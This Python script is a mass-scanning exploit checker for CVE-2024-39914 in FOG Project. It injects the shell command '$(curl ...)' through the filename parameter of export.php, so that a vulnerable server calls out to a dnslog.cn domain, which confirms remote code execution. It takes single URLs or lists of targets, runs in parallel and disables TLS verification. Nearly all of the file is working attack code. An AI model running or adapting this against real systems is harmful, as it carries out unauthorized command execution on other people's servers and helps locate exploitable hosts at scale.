from multiprocessing import Pool

import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        getdomain = requests.get(url='http://dnslog.cn/getdomain.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
        domain = str(getdomain.text)
        target_url = urljoin(url, "/fog/management/export.php?filename=$(curl+123.{})&type=pdf".format(domain))
        data = """fogguiuser=fog&nojson=2"""
        requests.post(target_url, verify=False, headers=headers, data=data, timeout=25)
        for i in range(0, 3):
            refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
            time.sleep(1)
            if domain in refresh.text:
                print(f"\033[31mDiscovered:{url}:FOGProject_CVE-2024-39914_RCE!\033[0m")
                return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    pool = Pool(processes=30)
    url = args.url
    txt = args.txt
    if url:
        if 'http' in url:
            check(url)
        else:
            url = f'http://{url}'
            check(url)
            url = f'https://{url}'
            check(url)
    elif txt:
        targets = []
        urls = read_file(txt)
        for url in urls:
            if 'http' in url:
                check(url)
            else:
                url = f'http://{url}'
                check(url)
                targets.append(url)
                url = f'https://{url}'
                check(url)
                targets.append(url)
        pool.map(check,targets)
    else:
        print("help")